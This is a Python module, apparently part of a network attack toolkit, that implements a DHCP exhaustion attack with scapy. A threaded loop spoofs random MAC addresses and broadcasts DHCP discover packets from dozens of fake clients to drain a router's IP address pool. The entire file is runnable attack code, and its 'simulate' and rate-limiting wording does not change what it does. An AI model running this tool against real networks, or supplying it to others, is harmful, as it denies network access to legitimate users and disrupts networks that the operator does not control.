import random
import time
import threading
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
from .base_attack import BaseAttack

class DHCPExhaustion(BaseAttack):
    """Simulate multiple DHCP clients to exhaust router's IP pool"""
    
    def __init__(self, interface: str, num_devices: int = 50):
        """
        Initialize DHCP exhaustion attack
        
        :param num_devices: Number of fake devices to simulate
        """
        super().__init__(interface)
        self.num_devices = num_devices
        self.sent_macs = set()

    def _generate_mac(self) -> str:
        """Generate RFC-compliant MAC address"""
        while True:
            mac = "02:00:00:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            if mac not in self.sent_macs:
                self.sent_macs.add(mac)
                return mac

    def _create_dhcp_packet(self):
        """Build DHCP discovery packet"""
        mac = self._generate_mac()
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
               IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / \
               BOOTP(chaddr=mac) / \
               DHCP(options=[("message-type", "discover"), 
                            ("client_id", mac),
                            "end"])

    def _send_loop(self):
        """Main attack loop with rate limiting"""
        try:
            # Calculate safe packets per second
            base_pps = max(1, self.num_devices)  # Ensure at least 1 pps
            allowed_pps = self._rate_limit(base_pps)
            delay = 1.0 / allowed_pps
            
            while self.running:
                pkt = self._create_dhcp_packet()
                sendp(pkt, iface=self.interface, verbose=False)
                self.logger.info(f"Sent DHCP request from {pkt.src}")
                time.sleep(delay)
        except Exception as e:
            self.logger.error(f"DHCP loop error: {str(e)}")
            self.stop()

    def start(self):
        """Launch attack thread"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._send_loop)
            self.thread.start()
            self.logger.info(f"Started DHCP exhaustion with {self.num_devices} devices")

    def stop(self):
        """Stop attack thread"""
        self.running = False
        if self.thread and self.thread.is_alive():
            self.thread.join()
        self.logger.info("DHCP exhaustion stopped")